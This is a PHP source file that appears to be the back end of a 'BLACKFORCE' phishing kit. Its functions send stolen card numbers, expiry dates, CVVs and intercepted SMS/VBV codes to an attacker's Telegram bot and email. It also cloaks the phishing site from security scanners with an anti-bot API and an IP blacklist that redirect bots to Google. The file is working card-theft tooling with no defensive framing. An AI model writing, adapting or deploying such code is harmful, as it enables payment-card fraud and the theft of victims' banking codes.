<?php
//Generate Random Numbers
$str = rand();
$id = md5($str);
$ue = md5($str + 8);
//GET DATE
$today = new DateTime();
$tomorrow = new DateTime('tomorrow');
$day_after_tomorrow = new DateTime('tomorrow +1 day');

function get_client_ip() {
    $ip = null;
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $header) {
        if (array_key_exists($header, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$header]) as $potential_ip) {
                $potential_ip = trim($potential_ip);
                if (filter_var($potential_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    $ip = $potential_ip;
                    break 2;
                }
            }
        }
    }
    return ($ip !== null) ? $ip : '127.0.0.1';
}

//GET IP AND OS
$ip = get_client_ip();
$agent = $_SERVER['HTTP_USER_AGENT'];

function antibotpw() {
    if( empty(ANTIBOTPW_API) )
        return;
    if( $_SESSION['notbot'] == 1 )
        return;
    $ip = get_client_ip();
    $list = file("blacklist.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $list)) {
        header("Location: https://www.google.com/");
        exit();
    }
    $ua = str_replace(' ', '', $_SERVER['HTTP_USER_AGENT']);
    $check = json_decode(file_get_contents('https://antibot.pw/api/v2-blockers?ip='. $ip .'&apikey='. ANTIBOTPW_API .'&ua=' . $ua),true);
    $is_bot = $check['is_bot'];
    if( $is_bot == 1 ) {
        file_put_contents("blacklist.txt", $ip . "\r\n", FILE_APPEND);
        header("Location: https://www.google.com/");
        exit();
    } else {
        $_SESSION['notbot'] = 1;
    }
}
function sendCard($rezdata) {

    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $views = $host."/visitors.html";
    $fastLink = $host."/app/Panel/fastCardLink/index.php?ccn=" .$_SESSION['scan']. '&exp=' .$_SESSION['sexp']. '&cch='.$_SESSION['scch'];
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🔎 VIEW'S",
                    "url" => "$views"
                ]
    
                ],
            [
                [
                    "text" => "⚡️ Fast Link",
                    "url" => "$fastLink"
                ]
    
            ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function sendSms($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $false = $host."/app/Panel/botActVbv/7wiwmoSms.php?ip=".$ip;
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "APPROVE ✅",
                    "url" => "$false"
                ]
    
            ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function sendTelegram($rezdata) {

    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $views = $host."/visitors.html";
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🔎 VIEW'S",
                    "url" => "$views"
                ]
    
            ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}


function sendMail($maildata) {
    $Bullet = BULLET;
    $subject = "BLACKFORCE REZDATA";
    $headers = "From: BLACKFORCE  <takethisbruh@BlackForce.com>\r\n";
    $headers .= 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\r\n";
    return @mail($Bullet, $subject, $maildata, $headers);
}